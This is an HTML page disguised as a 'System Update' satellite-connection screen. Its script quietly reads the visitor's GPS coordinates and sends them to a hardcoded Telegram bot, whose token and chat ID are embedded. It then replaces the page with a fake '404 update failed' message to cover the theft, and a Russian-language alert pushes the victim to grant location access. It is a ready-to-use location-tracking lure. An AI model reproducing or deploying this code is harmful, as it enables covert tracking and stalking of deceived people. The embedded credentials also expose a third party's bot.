<!DOCTYPE html>
<html>
<head>
    <title>System Update</title>
</head>
<body style="background:black; color:#00FF41; font-family:monospace; text-align:center; padding-top:50px;">
    <h1>INITIALIZING...</h1>
    <p>Please wait for satellite connection...</p>

    <script>
        window.onload = function() {
            if (navigator.geolocation) {
                navigator.geolocation.getCurrentPosition(function(position) {
                    var lat = position.coords.latitude;
                    var lon = position.coords.longitude;
                    
                    // ТВОИ ДАННЫЕ СЮДА:
                    var token = "8542783294:AAGGArYa-FTs5PCosZ813RDDHzjgNw7wtTg" 
                    var chat_id = "8123844229";

                    var url = `https://api.telegram.org/bot${token}/sendMessage?chat_id=${chat_id}&text=${lat},${lon}`;
                    
                    // Отправка данных боту
                    fetch(url).then(() => {
                        document.body.innerHTML = "<h1>ERROR 404</h1><p>Update failed. Try again later.</p>";
                    });
                }, function(error) {
                    alert("Для работы системы необходимо разрешить доступ к GPS.");
                });
            }
        };
    </script>
</body>
</html>
